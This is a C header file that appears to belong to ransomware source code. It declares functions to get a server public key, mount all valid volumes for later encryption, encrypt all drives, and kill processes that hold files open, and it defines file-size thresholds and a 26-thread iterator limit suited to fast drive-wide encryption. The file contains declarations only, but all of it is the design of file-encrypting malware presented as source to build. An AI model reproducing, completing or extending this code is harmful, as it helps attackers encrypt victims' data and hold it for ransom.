#pragma once

#include "wsinternal.h"

/* Max number of iterators. */
#define MAX_ITERATOR_THREADS	26

/* Size of block to read from a file. */
#define READ_BLOCK_SIZE		0x100000i64
/* Min size of a file to be considered a medium file. */
#define MEDIUM_FILE_SIZE	0x500000i64
/* Min size of a file to be considered a large file. */
#define LARGE_FILE_SIZE		0x1400000i64
/* Min size of a volume to be mounted */
#define VOLUME_SIZE			0x40000000ui64

/// <summary>
/// Get the servers public key.
/// </summary>
/// <returns>Servers public key</returns>
wchar_t* getPublicKey();

/// <summary>
/// Initialize required data before encryption.
/// </summary>
/// <returns>True if successfully initialized, FALSE, otherwise.</returns>
BOOL preEncryptionInitialization();

/// <summary>
/// Mount all valid volumes to be encrypted later.
/// </summary>
/// <returns>TRUE if successfully mount available volumes, FALSE, otherwise.</returns>
BOOL mountVolumes();

/// <summary>
/// Encrypt all drives.
/// </summary>
/// <returns>TRUE if succeeded, FALSE, otherwise.</returns>
BOOL encryptDrives();

/// <summary>
/// Terminate all processes that are using a file.
/// </summary>
/// <param name="filePath">Path of the file.</param>
/// <returns>TRUE if succeeded, FALSE, otherwise.</returns>
BOOL terminateFileProcesses(const wchar_t* filePath);